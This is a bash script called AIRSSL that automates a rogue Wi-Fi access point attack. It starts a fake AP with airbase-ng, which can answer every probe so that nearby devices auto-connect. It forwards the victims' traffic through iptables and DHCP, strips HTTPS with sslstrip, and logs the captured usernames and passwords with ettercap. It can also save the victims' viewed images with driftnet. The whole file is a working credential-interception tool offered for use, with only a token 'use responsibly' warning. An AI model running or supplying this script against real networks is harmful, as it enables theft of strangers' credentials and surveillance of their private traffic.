#!/bin/bash
# (C)opyright 2009 - killadaninja - Modified G60Jon 2010
# airssl.sh - v1.0
# visit the man page NEW SCRIPT Capturing Passwords With sslstrip AIRSSL.sh

# Network questions
echo
echo "AIRSSL 2.0 - Credits killadaninja & G60Jon  "
echo
route -n -A inet | grep UG
echo
echo
echo "Enter the networks gateway IP address, this should be listed above. For example 192.168.0.1: "
read -e gatewayip
echo -n "Enter your interface that is connected to the internet, this should be listed above. For example eth1: "
read -e internet_interface
echo -n "Enter your interface to be used for the fake AP, for example wlan0: "
read -e fakeap_interface
echo -n "Enter the ESSID you would like your rogue AP to be called: "
read -e ESSID
airmon-ng start $fakeap_interface
fakeap=$fakeap_interface
fakeap_interface="mon0"

# Fake ap setup
echo "[+] Configuring FakeAP...."
echo
echo "Airbase-ng will run in its most basic mode, would you like to
configure any extra switches? "
echo
echo "Choose Y to see airbase-ng help and add switches. "
echo "Choose N to run airbase-ng in basic mode with your choosen ESSID. "
echo "Choose A to run airbase-ng in respond to all probes mode (in this mode your choosen ESSID is not used, but instead airbase-ng responds to all incoming probes), providing victims have auto connect feature on in their wireless settings (MOST DO), airbase-ng will imitate said saved networks and victim will connect to us, likely unknowingly. PLEASE USE THIS OPTION RESPONSIBLY. "
echo "Y, N or A "
 

read ANSWER

if [ $ANSWER = "y" ] ; then
airbase-ng --help
fi

if [ $ANSWER = "y" ] ; then
echo
echo -n "Enter switches, note you have already chosen an ESSID -e this cannot be
redefined, also in this mode you MUST define a channel "
read -e aswitch
echo
echo "[+] Starting FakeAP..."
xterm -geometry 75x15+1+0 -T "FakeAP - $fakeap - $fakeap_interface" -e airbase-ng "$aswitch" -e "$ESSID" $fakeap_interface & fakeapid=$!
sleep 2
fi

if [ $ANSWER = "a" ] ; then
echo
echo "[+] Starting FakeAP..."
xterm -geometry 75x15+1+0 -T "FakeAP - $fakeap - $fakeap_interface" -e airbase-ng -P -C 30 $fakeap_interface & fakeapid=$!
sleep 2
fi


if [ $ANSWER = "n" ] ; then
echo
echo "[+] Starting FakeAP..."
xterm -geometry 75x15+1+0 -T "FakeAP - $fakeap - $fakeap_interface" -e airbase-ng -c 1 -e "$ESSID" $fakeap_interface & fakeapid=$!
sleep 2
fi

# Tables
echo "[+] Configuring forwarding tables..."
ifconfig lo up
ifconfig at0 up &
sleep 1
ifconfig at0 192.168.2.129 netmask 255.255.255.128
route add -net 192.168.2.128 netmask 255.255.255.128 gw 192.168.2.129
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables --table nat --append POSTROUTING --out-interface $internet_interface -j MASQUERADE
iptables --append FORWARD --in-interface mon0 -j ACCEPT
iptables -t nat -A PREROUTING -p udp -j DNAT --to $gatewayip

# DHCP
echo "[+] Setting up DHCP..."
echo > /var/lib/dhcp/dhcpd.leases
sleep 2
rm -f /var/run/dhcpd.pid
sleep 2
touch /var/run/dhcpd.pid
sleep 2
chown root:dhcpd /var/run/dhcpd.pid
xterm -geometry 75x20+1+100 -T DHCP -e dhcpd -d -f -cf /etc/dhcp/dhcpd.conf mon0 & dhcpid=$!
sleep 3

# Sslstrip
echo "[+] Starting sslstrip..."
xterm -geometry 75x15+1+200 -T sslstrip -e sslstrip -f -p -k 10000 & sslstripid=$!
sleep 2

# Ettercap
echo "[+] Configuring ettercap..."
echo
echo "Ettercap will run in its most basic mode, would you like to
configure any extra switches for example to load plugins or filters,
(advanced users only), if you are unsure choose N "
echo "Y or N "
read ETTER
if [ $ETTER = "y" ] ; then
ettercap --help
fi

if [ $ETTER = "y" ] ; then
echo -n "Interface type is set you CANNOT use "\"interface type\"" switches here
For the sake of airssl, ettercap WILL USE -u and -p so you are advised
NOT to use -M, also -i is already set and CANNOT be redifined here.
Ettercaps output will be saved to /pentest/wireless/airssl/passwords
DO NOT use the -w switch, also if you enter no switches here ettercap will fail "
echo
read "eswitch"
echo "[+] Starting ettercap..."
xterm -geometry 73x25+1+300 -T ettercap -s -sb -si +sk -sl 5000 -e ettercap -p -u "$eswitch" -T -q -i mon0 & ettercapid=$!
sleep 1
fi

if [ $ETTER = "n" ] ; then
echo
echo "[+] Starting ettercap..."
xterm -geometry 73x25+1+300 -T ettercap -s -sb -si +sk -sl 5000 -e ettercap -p -u -T -q -w ~/passwords -i mon0 & ettercapid=$!
sleep 1
fi

# Driftnet
echo
echo "[+] Driftnet?"
echo
echo "Would you also like to start driftnet to capture the victims images,
(this may make the network a little slower), "
echo "Y or N "
read DRIFT

if [ $DRIFT = "y" ] ; then
mkdir -p "~/driftnetdata"
echo "[+] Starting driftnet..."
driftnet -i $internet_interface -p -d ~/driftnetdata & dritnetid=$!
sleep 3
fi

xterm -geometry 75x15+1+600 -T SSLStrip-Log -e tail -f sslstrip.log & sslstriplogid=$!

clear
echo
echo "[+] Activated..."
echo "Airssl is now running, after victim connects and surfs their credentials will be displayed in ettercap. You may use right/left mouse buttons to scroll up/down ettercaps xterm shell, ettercap will also save its output to /pentest/wireless/airssl/passwords unless you stated otherwise. Driftnet images will be saved to /pentest/wireless/airssl/driftftnetdata "
echo
echo "[+] IMPORTANT..."
echo "After you have finished please close airssl and clean up properly by hitting Y,
if airssl is not closed properly ERRORS WILL OCCUR "
read WISH

# Clean up
if [ $WISH = "y" ] ; then
echo
echo "[+] Cleaning up airssl and resetting iptables..."

kill ${fakeapid}
kill ${dhcpid}
kill ${sslstripid}
kill ${ettercapid}
kill ${dritnetid}
kill ${sslstriplogid}

airmon-ng stop $fakeap_interface
airmon-ng stop $fakeap
echo "0" > /proc/sys/net/ipv4/ip_forward
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain

echo "[+] Clean up successful..."
echo "[+] Thank you for using airssl, Good Bye..."
exit

fi
exit
